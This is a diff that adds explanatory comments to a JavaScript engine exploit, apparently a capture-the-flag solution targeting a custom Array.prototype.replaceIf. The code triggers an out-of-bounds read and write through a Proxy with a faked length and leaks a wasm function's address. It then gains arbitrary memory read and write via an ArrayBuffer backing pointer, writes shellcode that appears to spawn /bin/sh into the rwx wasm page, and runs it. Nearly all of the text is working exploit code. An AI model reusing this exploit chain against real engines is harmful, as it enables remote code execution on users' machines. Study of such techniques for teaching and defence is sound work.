@@ -31,28 +31,35 @@ const handler1 = {
 		if (prop === 'length') {
 			return 0x1000;
 		} else {
-			return Reflect.get(...arguments);
+			return target[prop];
 		}
 	}
 };
+// handler for Proxy used to trigger OOB
 
 const arrs = [];
 const abs = [];
 var a = [1.1];
+// the array used for OOB accessing
 dp(a);
 
 for (var i = 0; i < 0x10; i++)
 {
 	abs.push(new ArrayBuffer(0x100+i));
+	// size can be used to identify the index
 	arrs.push({a:0xdead, b:0xbeef, d:wmain})
 }
+// allocate ArrayBuffer and Objects just after [1.1]
 var p = new Proxy(a, handler1);
+// Proxy used to trigger OOB
 
 function oobRead(idx)
 {
 	var ret;
 	Array.prototype.replaceIf.call(p, idx,
 		function(element){ret=element;return false;}, 1);
+	// the element passed into callback function
+	// will be an OOB read
 	return ret;
 }
 
@@ -66,8 +73,11 @@ for (let i = 0; i < 0x1000; i++)
 		break;
 	}
 }
+// search the first object
+// in order to leak wmain object address
 print(objIdx);
 var wmainAddr = d2u(oobRead(objIdx + 2));
+// leak the wmain address
 print(hex(wmainAddr));
 dp(wmain);
 dp(abs[0]);
@@ -86,12 +96,18 @@ for (let i = 0; i < 0x1000; i++)
 		break;
 	}
 }
+// find the ArrayBuffer according to its signature
+// heapAddr is the original heap address
+// absIdx is the index of ArrayBuffer object found in abs array
+// heapIdx is the index of backingOffset in array for OOB
 print(absIdx)
 print(hex(heapAddr))
 
 function oobWrite(idx, val)
 {
 	Array.prototype.replaceIf.call(p, idx, ()=>true, u2d(val));
+	// let callback return true,
+	// so `val` will be written to float64 array
 }
 
 const dataView = new DataView(abs[absIdx]);
@@ -99,7 +115,9 @@ const dataView = new DataView(abs[absIdx]);
 function memRead(addr)
 {
 	oobWrite(heapIdx, addr);
+	// write backingOffset the given address
 	return d2u(dataView.getFloat64(0, true));
+	// read a float64 from that address
 }
 
 function getRwxAddr(addrWmain)
@@ -110,11 +128,15 @@ function getRwxAddr(addrWmain)
 	// return memRead(wasmInstanceAddr + 0x88) - 1;
 	//return memRead(addrWmain + 0x30) - 0x1;
 	return memRead(addrWmain - 0xf0);
+	// after some investigation,
+	// it seems addrWmain-0xf0 always stores the rwx page
+	// which will be executed when the wasm function is called
 }
 const rwxPageAddr = getRwxAddr(wmainAddr - 1);
 print(hex(rwxPageAddr))
 
 oobWrite(heapIdx, rwxPageAddr);
+// write the backingOffset to rwx page
 var shellcode = [
     0x99583b6a, 0x2fbb4852,
     0x6e69622f, 0x5368732f,
@@ -124,7 +146,7 @@ for (var i = 0; i < shellcode.length; i++)
 {
 	dataView.setUint32(i * 4, shellcode[i], true);
 }
+// write the shellcode
 
 wmain()
-
-readline();
+// execute the shellcode
